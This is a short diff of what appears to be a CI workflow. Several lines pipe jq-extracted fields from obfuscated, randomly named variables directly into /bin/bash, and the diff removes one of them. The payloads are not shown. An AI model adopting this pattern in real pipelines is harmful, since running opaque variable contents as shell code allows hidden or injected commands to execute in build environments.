@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$tr7" | jq -r .f5 | /bin/bash
           echo $o3503 | jq -r .lm91 | /bin/bash
           printf '%s' "$l8499" | jq -r .u1573 | /bin/bash
-          printf '%s' "$kwiud5" | jq -r .t2823 | /bin/bash
           echo $kxx0528 | jq -r .lnbmh0 | /bin/bash
           printf '%s' "$fa8" | jq -r .iglf761 | /bin/bash
 
